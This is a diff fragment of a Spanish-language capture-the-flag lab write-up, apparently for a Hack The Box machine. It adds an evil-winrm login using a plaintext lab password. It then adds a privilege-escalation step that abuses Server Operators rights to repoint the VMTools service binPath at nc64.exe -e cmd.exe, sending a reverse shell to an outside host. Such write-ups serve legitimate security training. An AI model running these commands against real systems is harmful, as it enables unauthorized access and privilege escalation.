@@ -91,8 +91,20 @@ crackmapexec winrm 10.129.247.90 -u 'svc-printer' -p '1edFg43012!!'
 Si nos pone P0wned entonces tenemos posibilidad de entrar por Winrm.
 
 ```
+evil-winrm -u 'svc-printer' -p '1edFg43012!!' -i 10.129.95.241 
+```
+
+## Prives
+
+Entro a la maquina intento enumerar y me doy cuenta queno hay mucho sin embargo este usuario pertenece al grupo priviligeado de Server Operators el cual tiene entre muchas capacidades la de manipular servicios por  lo que vamos  ponerle nuestro nc
 
 ```
+sc.exe config VMTools binPath="C:\Windows\Temp\privesc\nc64.exe -e cmd.exe 10.10.14.146"
+sc.exe stop VMTools
+sc.exe start VMTools
+
+```
+
 
 
 
